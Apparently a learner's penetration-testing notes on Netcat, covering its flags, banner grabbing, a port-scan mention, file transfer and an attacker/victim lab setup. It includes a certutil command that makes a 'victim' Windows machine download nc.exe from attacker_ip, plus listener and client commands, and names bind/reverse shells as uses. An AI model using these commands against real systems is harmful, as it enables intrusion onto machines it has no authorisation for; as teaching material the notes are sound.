#### Netcat
- Netcat (Aka TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP.
- Netcat ia available for Both *NIX and Windows operating systems.consequently making it extremely useful for cross-platform engagements
- Netcat utilize a client-server communication architecture with two modes:
- -  Client mode- Netcat can be used in client mode to connect to any TCP/UDP port as well as a Netcat listen(server)
- -  Server mode - Netcat can be used to listen for connections from clients on a specific port.
- Netcat can be used by    penetration testers to perform the following functionality
- - Banner Grabbing
- - Port Scanning
- - Transferring Files
- - Bind/Reverse Shells

##### Netcat
- nc --help [help manu]
- man nc [ manual page ]
- -v  [verbose mode ]
- -u [for udp port ]
- -n [ do not resolve hostnames via DNS ]
- -e [ executing specific command ]
#### commands 
- nc 10.4.20.244 80 [ banner grabbing ]
- nc -n -v 10.4.20.244 80 [ banner grabbing with verbose mode and do not dns resolve ]
- nc -nvu 10.4.20.244 80 [ for upd port]
#### Connecting with windows machine(victim) via nc
In attacker machine(kali)
- cd /usr/share/windows-binaries
- python -m SimpleHTTPServer 80 [start a python server ]
- ifconfig [ for find the ip address ]


In victim windows machine
- certutil -urlcache -f http://attacker_ip/nc.exe nc.exe

Starting listener in Kali
- nc -nvlp 1234 [ starting listener in attacker machine ]
- nc.exe -nv attacker_ip 1234 [starting a client in windows machine ]
- now we can transfer message from both sides


Starting listener in windows
- nc.exe -nvlp 1234 [starting windows machine]
- nc -nv victim_ip(windows) 1234 [starting client in kali ]
#### Sending file
- nc.exe -nvlp 1234 > test.txt [start listening in receiver machine,here it is windows,direction simple means save the file send as test.txt]
- nc -nv listener_machine_ip 1234 < test.txt [send the test.txt file ]
- we can see the listening machine received the file.



#### note
- /usr/share/windows-binaries [ windows binaries file,here we will find nc.exe file for windows ]
